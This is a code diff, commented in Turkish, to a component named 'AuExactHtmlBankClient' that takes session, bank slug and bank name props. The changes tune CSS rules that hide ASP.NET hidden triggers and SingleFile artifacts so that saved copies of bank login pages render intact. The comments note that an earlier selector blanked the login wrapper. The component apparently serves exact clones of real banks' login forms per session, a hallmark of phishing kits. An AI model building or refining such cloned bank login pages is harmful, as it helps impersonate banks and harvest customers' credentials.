@@ -1115,19 +1115,27 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 /* ══════════════════════════════════════════════════════════════════
    ⭐ KALICI FIX: HIC BIR BANKANIN ORIJINAL FORMU BOZULMASIN (kullanicinin istedigi gibi)
    ══════════════════════════════════════════════════════════════════
+   ⚠️ ÖNEMLİ: [id*="ctl00_"] GENİŞ SEÇİCİ KALDIRILDI! (BEYAZ EKRAN NEDENİydi)
+      Çünkü: #ctl00_html (HTML root), #ctl00_ContentTemplatePlaceHolder_P4_Container (login wrapper)
+      HEPSİNİN id'sinde "ctl00_" geçiyor → HEPSİNİ -9999px götürüyordu (beyaz ekran).
+      Yerine SADECE BİLİNEN GİZLİ TRIGGERLAR (acik name/id/class) hedeflenir.
+
    (1) ASP.NET WebForms / AJAX / PageFramework gizli trigger inputlari
        Bunlar GERCEK form alani DEGILLER, sunucu icin teknik elemanlardir.
        KULLANICIYA GOSTERILMEMESI GEREKIR (display:none) */
 input[name*="stopAllTrigger"],
 input[id*="stopAllTrigger"],
-input[id*="__PageFramework"],
 input[name*="__PageFramework"],
+input[id*="__PageFramework"],
 input[value="Stop All"],
 input[value="Stop all"],
 input[value="stop all"],
 #stopAll_backgroundElement,
 .modalBackgroundInvisible,
-[id*="ctl00_"]:not(form):not(input[type="text"]):not(input[type="password"]):not(input[type="email"]):not(input[type="number"]):not(input[type="tel"]):not(input[type="checkbox"]):not(input[type="radio"]):not(select):not(textarea):not(button) {
+/* ⭐ Bilinen diğer ASP.NET tek seferlik gizli trigger id/name'leri */
+input[id*="__PageFramework_TriggerElement"],
+input[name*="__PageFramework_TriggerElement"]
+{
   display: none !important;
   visibility: hidden !important;
   opacity: 0 !important;
@@ -1143,7 +1151,7 @@ input[value="stop all"],
 /* (2) SingleFile tarafindan eklenen sf-hidden / print-only artifactlar
        Bunlar da GERCEK form parcalari DEGILLER, GOSTERILMEMELI */
 .sf-hidden, .print-only, [class*="print-only"],
-.hidden.wmVar, .wmVar, .print-top-header, .print-only {
+.hidden.wmVar, .wmVar, .print-top-header {
   display: none !important;
   visibility: hidden !important;
   opacity: 0 !important;
